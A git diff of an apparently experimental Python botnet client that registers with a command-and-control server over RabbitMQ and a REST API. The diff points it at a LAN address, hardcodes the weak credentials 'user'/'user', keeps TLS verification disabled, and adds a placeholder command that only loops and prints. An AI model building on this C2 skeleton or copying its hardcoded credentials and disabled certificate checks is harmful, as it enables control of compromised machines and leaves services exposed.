@@ -19,8 +19,10 @@ class Client():
         self.botnet_id = 0
         self.bot_id = 0
         self.botnet_job_id = 0
-        self.c2server_ip = 'localhost'
-        self.connection = pika.BlockingConnection(pika.ConnectionParameters(host=self.c2server_ip))
+        # TODO: unsafe credentials
+        self.credentials = pika.PlainCredentials('user', 'user')
+        self.parameters = pika.ConnectionParameters('192.168.0.112', 5672, '/', self.credentials)
+        self.connection = pika.BlockingConnection(self.parameters)
 
 
     def register_bot(self):
@@ -85,7 +87,7 @@ class Client():
 
     def finish_command(self, result):
         self.event_controller.clear()
-        url = "https://localhost:44353/api/v1/BotnetJob/" + str(self.botnet_job_id)
+        url = "https://192.168.0.112:45455/api/v1/BotnetJob/" + str(self.botnet_job_id)
         requests.delete(url=url, verify=False)
         self.botnet_job_id = 0
 
@@ -104,7 +106,7 @@ class Client():
     @command_wrapper
     def command1(self, command_args):
         result = "Looped"
-        print("Command started")
+        print("Command 1 started")
         for i in range(6):
             print(f"Iteration {i}")
             time.sleep(1)
@@ -113,7 +115,13 @@ class Client():
 
     @command_wrapper
     def command2(self, command_args):
-        pass
+        result = "Looped"
+        print("Command 2 started")
+        for i in range(3):
+            print(f"Iteration {i}")
+            time.sleep(1)
+        print("Command finished")
+        return (True, result)
 
 
 if __name__ == "__main__":
